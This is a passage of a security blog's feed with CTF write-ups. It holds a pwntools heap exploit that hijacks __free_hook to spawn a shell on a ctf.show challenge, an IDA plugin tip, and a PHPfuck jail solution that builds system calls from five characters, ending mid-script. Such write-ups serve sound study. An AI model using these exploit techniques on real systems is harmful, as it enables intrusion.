class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/09/21 01:25:02</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">0</span></span><br><span class="line">elf=<span class="string">'./Moon_note.note'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">context.arch=e.arch</span><br><span class="line">ip_port=[<span class="string">'pwn.challenge.ctf.show'</span>,<span class="number">28079</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_note</span><span class="params">(title)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Title:'</span>)</span><br><span class="line">    p.sendline(str(title))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(title,size,text)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Title of note to write content:'</span>)</span><br><span class="line">    p.sendline(str(title))</span><br><span class="line">    p.recvuntil(<span class="string">'Size of content'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'Content:'</span>)</span><br><span class="line">    p.sendline(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(title)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Title of note to show content:'</span>)</span><br><span class="line">    p.sendline(str(title))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(title)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Choice: Title of note to delete:'</span>)</span><br><span class="line">    p.sendline(str(title))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x20</span>):</span><br><span class="line">    add_note(str(i))</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x48</span>,<span class="string">'11111'</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x48</span>,<span class="string">'11111'</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#free(2)</span></span><br><span class="line">add_note(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add_note(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">addr=u64(p.recvline()[<span class="number">1</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.info(hex(addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x48</span>,p64(addr<span class="number">-0x20</span>)+p64(addr<span class="number">-0x20</span>))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x48</span>,<span class="string">'11111'</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x48</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x461</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">14</span>):</span><br><span class="line">    add(i+<span class="number">6</span>,<span class="number">0x48</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add_note(<span class="number">4</span>)</span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">molloc_hook_addr=u64(p.recvline()[<span class="number">1</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-96</span><span class="number">-0x10</span></span><br><span class="line">log.info(hex(molloc_hook_addr))</span><br><span class="line">x=finder(<span class="string">'__malloc_hook'</span>,molloc_hook_addr)</span><br><span class="line"></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">add_note(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">21</span>,<span class="number">0x48</span>,p64(x.dump(<span class="string">'__free_hook'</span>)))</span><br><span class="line">add(<span class="number">22</span>,<span class="number">0x48</span>,p64(x.dump(<span class="string">'__free_hook'</span>)))</span><br><span class="line">add(<span class="number">23</span>,<span class="number">0x48</span>,p64(x.dump(<span class="string">'system'</span>)))</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>\`could not patch the PLT stub; unexpected PLT format or the file has been modified after linking!\`报错缓解方法</title>
      <link href="/2021/09/16/&#39;could%20not%20patch%20the%20PLT%20stub;%20unexpected%20PLT%20format%20or%20the%20file%20has%20been%20modified%20after%20linking!&#39;%E6%8A%A5%E9%94%99%E7%BC%93%E8%A7%A3%E6%96%B9%E6%B3%95/"/>
      <url>/2021/09/16/&#39;could%20not%20patch%20the%20PLT%20stub;%20unexpected%20PLT%20format%20or%20the%20file%20has%20been%20modified%20after%20linking!&#39;%E6%8A%A5%E9%94%99%E7%BC%93%E8%A7%A3%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>额,之前一直被<code>could not patch the PLT stub; unexpected PLT format or the file has been modified after linking!</code>这个报错恶心了很久,今天无意间终于找到了解决(补救方案)。<a id="more"></a></p><h2 id="报错状况描述"><a href="#报错状况描述" class="headerlink" title="报错状况描述"></a>报错状况描述</h2><p>在报错后，出现 <code>.plt.sec</code> 的segement。libc的symbols能被ida正常解析，但是并未被ida自动连接绑定上。本该解析libc symbols的地方，显示的是<code>.plt.sec</code>的值， 如图：</p><p><img src="image-20210916112022149.png" alt="image-20210916112022149"></p><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>添加插件：pltresolver</p><p>项目地址：<a href="https://github.com/veritas501/pltresolver" target="_blank" rel="noopener">https://github.com/veritas501/pltresolver</a></p><p>在ida项目中的<code>plugins</code>倒入脚本：</p><p><img src="image-20210916113633798.png" alt="image-20210916113633798"></p><p>打开ida看到<code>pltResolver plugin has been loaded.Press Ctrl+Shift+J to resolve .plt.sec symbols.</code>即为倒入成功！</p><p><img src="image-20210916113730185.png" alt="image-20210916113730185"></p><h2 id="修复后效果"><a href="#修复后效果" class="headerlink" title="修复后效果"></a>修复后效果</h2><p>看到ida 把libc sysmbols用重新识别上了： </p><p><img src="image-20210916113420325.png" alt="image-20210916113420325"></p>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ida </tag>
            
            <tag> problem_resolve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>5种字符&#39;(^.9)&#39;构造php_shellcode</title>
      <link href="/2021/09/03/5%E7%A7%8D%E5%AD%97%E7%AC%A6%E6%9E%84%E9%80%A0php_shellcode/"/>
      <url>/2021/09/03/5%E7%A7%8D%E5%AD%97%E7%AC%A6%E6%9E%84%E9%80%A0php_shellcode/</url>
      
        <content type="html"><![CDATA[<p>2021_uiuctf中出了一道jali题PHPfuck,题目要求用5种字符构造出php shellcode,感觉很有意思便记录下来。<a id="more"></a></p><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>这道题给的很洁净，就是下面的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Flag is inside ./flag.php :)</span></span><br><span class="line">($x=str_replace(<span class="string">"`"</span>,<span class="string">""</span>,strval($_REQUEST[<span class="string">"x"</span>])))&amp;&amp;strlen(count_chars($x,<span class="number">3</span>))&lt;=<span class="number">5</span>?<span class="keyword">print</span>(<span class="keyword">eval</span>(<span class="string">"return $x;"</span>)):show_source(<span class="keyword">__FILE__</span>)&amp;&amp;phpinfo();</span><br></pre></td></tr></table></figure><p>（当然在比赛结束后，官方也分享了环境<a href="https://github.com/sigpwny/UIUCTF-2021-Public/tree/master/jail/phpfuck）" target="_blank" rel="noopener">https://github.com/sigpwny/UIUCTF-2021-Public/tree/master/jail/phpfuck）</a></p><p>题目通过了<code>strlen(count_chars($x,3))&lt;=5</code>限制我们最多用5个字符。</p><p>这五个字符，一度困扰了我很久，因为我一开始想到的是<code>(^.&#39;)</code>。。。。。。</p><h2 id="PHP特性"><a href="#PHP特性" class="headerlink" title="PHP特性"></a>PHP特性</h2><h3 id="双标的"><a href="#双标的" class="headerlink" title="双标的."></a>双标的<code>.</code></h3><p>在php中，<code>.</code>号又对于两个字符串间有连接的作用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(<span class="string">'le'</span>.<span class="string">'xsd6'</span>) <span class="comment">#string(6) "lexsd6"</span></span><br></pre></td></tr></table></figure><p>对两个数字间的<code>.</code>号，php会将他们看作是小数关系</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(1.2) #float(1.2)</span><br></pre></td></tr></table></figure><p>但，如把<code>.</code>号附近的数字用括号括起来php会把他们进行字符串般的对待</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump((<span class="number">1</span>));<span class="comment">#int(1)</span></span><br><span class="line">var_dump((<span class="number">2</span>));<span class="comment">#int(2)</span></span><br><span class="line">var_dump((<span class="number">1</span>).(<span class="number">2</span>));<span class="comment">#string(2) "12"</span></span><br></pre></td></tr></table></figure><p>同时由于php对于大于309长度的数字转化为<code>INF</code>,<code>INF</code>与<code>(9)</code>同连接符号<code>.</code>得到string  <code>&quot;INF9&quot;</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var_dump(<span class="number">999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999</span>);</span><br><span class="line"><span class="comment"># float(INF)</span></span><br><span class="line">var_dump((<span class="number">999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999</span>).(<span class="number">9</span>));</span><br><span class="line"><span class="comment"># string(4) "INF9"</span></span><br></pre></td></tr></table></figure><h3 id="奇怪的"><a href="#奇怪的" class="headerlink" title="奇怪的^"></a>奇怪的<code>^</code></h3><p>由于php变量的特性。在进行<code>^</code>操作时，其结果也有些微妙变化。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">var_dump(<span class="string">'9'</span>^(<span class="number">1</span>)); <span class="comment">#int(8)</span></span><br><span class="line">var_dump(<span class="string">'9'</span>^<span class="string">'1'</span>);<span class="comment">#string(1) ""</span></span><br><span class="line">var_dump(<span class="string">'9'</span>^<span class="number">1</span>)<span class="comment">#;int(8)</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">var_dump(<span class="string">'99'</span>^(<span class="number">1</span>));<span class="comment">#int(98)</span></span><br><span class="line">var_dump(<span class="string">'99'</span>^<span class="string">'1'</span>);<span class="comment">#string(1) ""</span></span><br><span class="line">var_dump(<span class="string">'99'</span>^<span class="number">1</span>);<span class="comment">#int(98)</span></span><br><span class="line"></span><br><span class="line">var_dump(<span class="string">'99'</span>^(<span class="number">11</span>));<span class="comment">#int(104)</span></span><br><span class="line">var_dump(<span class="string">'99'</span>^<span class="string">'11'</span>);<span class="comment">#string(2) ""</span></span><br><span class="line">var_dump(<span class="string">'99'</span>^<span class="number">11</span>);<span class="comment">#int(104)</span></span><br><span class="line"></span><br><span class="line">var_dump(<span class="string">'c'</span>^<span class="number">11</span>);<span class="comment">#int(11)</span></span><br><span class="line">var_dump(<span class="string">'c'</span>^<span class="string">'11'</span>);<span class="comment">#string(1) "R"</span></span><br><span class="line">var_dump(<span class="string">'c'</span>^(<span class="number">11</span>));<span class="comment">#int(11)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var_dump(<span class="string">'cc'</span>^<span class="number">11</span>);<span class="comment">#int(11)</span></span><br><span class="line">var_dump(<span class="string">'cc'</span>^<span class="string">'11'</span>);<span class="comment">#string(2) "RR"</span></span><br><span class="line">var_dump(<span class="string">'cc'</span>^(<span class="number">11</span>));<span class="comment">#int(11)</span></span><br></pre></td></tr></table></figure><p>可以上看到几点：</p><ol><li>数字字符串（string型数字，如上：’99’.’9’）在与int数字进行<code>^</code>操作时，会把两者都视为int数字来进行操作。所以<code>&#39;9&#39;^(1)</code>实际上是<code>9^1</code>而不是<code>&#39;\x39&#39;^1</code>.</li><li>两不同字符串相<code>^</code>时，结果字符串长度跟原字符串两者中最小字符串长度的字符相等。(例:<code>&#39;c&#39;^&#39;11&#39; == &quot;R&quot;</code>)</li><li>字符字符串与int数字相与时，结果为原来int数字</li></ol><h3 id="小数四舍五入"><a href="#小数四舍五入" class="headerlink" title="小数四舍五入"></a>小数四舍五入</h3><p>在php中会把<code>.99</code>自动看成是小数<code>0.99</code>。</p><p>同当一个浮点数的小数位大于<code>.99999999999999999995</code>时，会自动变成进一位。小于会丢弃最后一位：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var_dump(<span class="number">.999999999999994</span>);<span class="comment">#float(0.99999999999999)</span></span><br><span class="line">var_dump(<span class="number">.999999999999995</span>);<span class="comment">#float(1)</span></span><br><span class="line">var_dump(<span class="number">.999999999999999</span>);<span class="comment">#float(1)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var_dump(<span class="number">3.99999999999994</span>);<span class="comment">#float(3.9999999999999)</span></span><br><span class="line">var_dump(<span class="number">3.99999999999995</span>);<span class="comment">#float(3.9999999999999)</span></span><br><span class="line">var_dump(<span class="number">3.999999999999955</span>);<span class="comment">#float(4)</span></span><br><span class="line">var_dump(<span class="number">3.99999999999996</span>);<span class="comment">#float(4)</span></span><br><span class="line">var_dump(<span class="number">3.99999999999999</span>);<span class="comment">#float(4)</span></span><br></pre></td></tr></table></figure><h2 id="构造思路"><a href="#构造思路" class="headerlink" title="构造思路"></a>构造思路</h2><h3 id="构造任意数字"><a href="#构造任意数字" class="headerlink" title="构造任意数字"></a>构造任意数字</h3><p>由于上面的特性,我们可以用<code>9(^).</code>这个字符简单的构造些数字如:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'106'</span>:<span class="string">'(99^9)'</span>,</span><br><span class="line"><span class="string">'99'</span>:<span class="string">'(99)'</span>,</span><br><span class="line"><span class="string">'19'</span>:<span class="string">'(((.99999999999999999999).(9))^(9)^(9))'</span>,</span><br><span class="line"><span class="string">'7'</span>:<span class="string">'(99.999999999999999999^99)'</span>,</span><br><span class="line"><span class="string">'3'</span>:<span class="string">'(9.9999999999999999999^9)'</span>,</span><br><span class="line"><span class="string">'1'</span>:<span class="string">'(.99999999999999999999)'</span>,</span><br><span class="line"><span class="string">'0'</span>:<span class="string">'(9^9)'</span>,</span><br><span class="line"><span class="string">'9'</span>:<span class="string">'(9)'</span>,</span><br></pre></td></tr></table></figure><p>我们再让这些数字相互<code>^</code>进而得到所有的单字符数字(<code>0-9</code>)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#39;1&#39;: &#39;(.99999999999999999999)&#39;, </span><br><span class="line">&#39;0&#39;: &#39;(9^9)&#39;, </span><br><span class="line">3&#39;: &#39;(9.9999999999999999999^9)&#39;, </span><br><span class="line">&#39;2&#39;: &#39;((9.9999999999999999999^9)^(.99999999999999999999))&#39;, </span><br><span class="line">&#39;5&#39;:&#39;(((99.999999999999999999^99)^(9.9999999999999999999^9))^(.99999999999999999999))&#39;, </span><br><span class="line">&#39;4&#39;: &#39;((99.999999999999999999^99)^(9.9999999999999999999^9))&#39;,</span><br><span class="line">&#39;7&#39;: &#39;(99.999999999999999999^99)&#39;,</span><br><span class="line">&#39;6&#39;: &#39;((99.999999999999999999^99)^(.99999999999999999999))&#39;, </span><br><span class="line">&#39;9&#39;: &#39;(9)&#39;, </span><br><span class="line">&#39;8&#39;: &#39;((9)^(.99999999999999999999))&#39;&#125;</span><br></pre></td></tr></table></figure><h3 id="通过可变函数构造任意字符"><a href="#通过可变函数构造任意字符" class="headerlink" title="通过可变函数构造任意字符"></a>通过可变函数构造任意字符</h3><h4 id="可变函数"><a href="#可变函数" class="headerlink" title="可变函数"></a>可变函数</h4><p>在php高版本中我们可以通过字符串+<code>(变量)</code>的方式来调用函数.例:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">'phpinfo'</span>)()<span class="comment">#phpinfo()</span></span><br><span class="line">(<span class="string">'syStem'</span>)(<span class="string">'ls'</span>)<span class="comment">#system('ls')</span></span><br></pre></td></tr></table></figure><p>同时，由于php函数名是不区分大小的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chr() ==CHr()</span><br><span class="line"><span class="string">'cHr'</span>()=chr()</span><br></pre></td></tr></table></figure><p>我们只要构造出<code>C/c</code>、<code>H/h</code>、<code>R/r</code>就可以调用<code>chr</code>从而构造任意字符。</p><h4 id="构造chr"><a href="#构造chr" class="headerlink" title="构造chr"></a>构造chr</h4><p>我们可以通过<code>&#39;INF9&#39;</code>,构造出不分大小写的<code>chr</code>.</p><p>经过test后发现:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#39;I&#39;^&#39;3&#39;^&#39;9&#39; &#x3D;&#x3D;&#39;C&#39;</span><br><span class="line">&#39;N&#39;^&#39;1&#39;^&#39;7&#39;&#x3D;&#39;H&#39;</span><br><span class="line">&#39;F&#39;^&#39;4&#39; &#x3D;&#x3D;&#39;r&#39;</span><br></pre></td></tr></table></figure><p>于是我们可以让：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(‘INF‘.(<span class="number">9</span>))^(<span class="string">'314'</span>)^(<span class="string">'97\X00X00'</span>)==<span class="string">'CHr'</span>;</span><br><span class="line"><span class="comment">#即</span></span><br><span class="line"><span class="string">'CHr'</span>==((((<span class="number">999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999</span>).(<span class="number">9</span>))^((<span class="number">9.9999999999999999999</span>^<span class="number">9</span>).(<span class="number">.99999999999999999999</span>).((<span class="number">99.999999999999999999</span>^<span class="number">99</span>)^(<span class="number">9.9999999999999999999</span>^<span class="number">9</span>))))^((<span class="number">9</span>).(<span class="number">99.999999999999999999</span>^<span class="number">99</span>).(((<span class="number">9</span>).(<span class="number">9</span>))^((<span class="number">9</span>).(<span class="number">9</span>)))));</span><br></pre></td></tr></table></figure><h2 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">def init():</span><br><span class="line">    num=&#123;</span><br><span class="line">        <span class="string">'106'</span>:<span class="string">'(99^9)'</span>,</span><br><span class="line">        <span class="string">'99'</span>:<span class="string">'(99)'</span>,</span><br><span class="line">        <span class="string">'19'</span>:<span class="string">'(((.99999999999999999999).(9))^(9)^(9))'</span>,</span><br><span class="line">        <span class="string">'7'</span>:<span class="string">'(99.999999999999999999^99)'</span>,</span><br><span class="line">        <span class="string">'3'</span>:<span class="string">'(9.9999999999999999999^9)'</span>,</span><br><span class="line">        <span class="string">'1'</span>:<span class="string">'(.99999999999999999999)'</span>,</span><br><span class="line">        <span class="string">'0'</span>:<span class="string">'(9^9)'</span>,</span><br><span class="line">        <span class="string">'9'</span>:<span class="string">'(9)'</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> y in range(<span class="number">3</span>):</span><br><span class="line">        key=num.keys()</span><br><span class="line">        <span class="keyword">for</span> i in range(len(key)):</span><br><span class="line">            <span class="keyword">for</span> x  in range(len(key)):</span><br><span class="line">                k=(int(key[x])^int(key[i]))</span><br><span class="line">                <span class="keyword">if</span> num.has_key(str(k))== <span class="keyword">False</span>:</span><br><span class="line">                    num[str(k)]=<span class="string">'('</span>+num[key[x]]+<span class="string">'^'</span>+num[key[i]]+<span class="string">')'</span></span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line">def one_num(num):</span><br><span class="line">    onum=&#123;&#125;</span><br><span class="line">    key=num.keys()</span><br><span class="line">    <span class="keyword">for</span> i in range(len(key)):</span><br><span class="line">        <span class="keyword">if</span> len(key[i])==<span class="number">1</span>:</span><br><span class="line">            onum[(key[i])]=num[key[i]]</span><br><span class="line">    <span class="keyword">return</span> onum</span><br><span class="line">def get_null(long=<span class="number">1</span>):</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">null</span>=<span class="string">'11'</span></span><br><span class="line"></span><br><span class="line">def chrstr(I,N,F):</span><br><span class="line">    <span class="keyword">global</span> int_num</span><br><span class="line">    I=I.split(<span class="string">'^'</span>)</span><br><span class="line">    N=N.split(<span class="string">'^'</span>)</span><br><span class="line">    F=F.split(<span class="string">'^'</span>)</span><br><span class="line">    MAX_num=max(len(I),len(N),len(F))</span><br><span class="line">    num=int_num</span><br><span class="line">    num[<span class="string">'null'</span>]=<span class="string">'(((9).(9))^((9).(9)))'</span></span><br><span class="line">    ret=<span class="string">'((999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9))'</span></span><br><span class="line">    <span class="comment">#print(I,N,F)</span></span><br><span class="line">    <span class="keyword">if</span> len(F)&lt;MAX_num:</span><br><span class="line">        </span><br><span class="line">            F.append(<span class="string">'null'</span>)</span><br><span class="line">    <span class="keyword">for</span> i in range(MAX_num):</span><br><span class="line">        ret=<span class="string">'('</span>+ret+<span class="string">"^("</span>+int_num[I[i]]+<span class="string">"."</span>+int_num[N[i]]+<span class="string">"."</span>+int_num[F[i]]+<span class="string">"))"</span></span><br><span class="line">    <span class="comment">#print(ret)</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line">    <span class="comment">#print(result)</span></span><br><span class="line">def guess_chr():</span><br><span class="line">    <span class="keyword">global</span> int_num</span><br><span class="line">    num=int_num</span><br><span class="line">    I_test=&#123;&#125;</span><br><span class="line">    N_test=&#123;&#125;</span><br><span class="line">    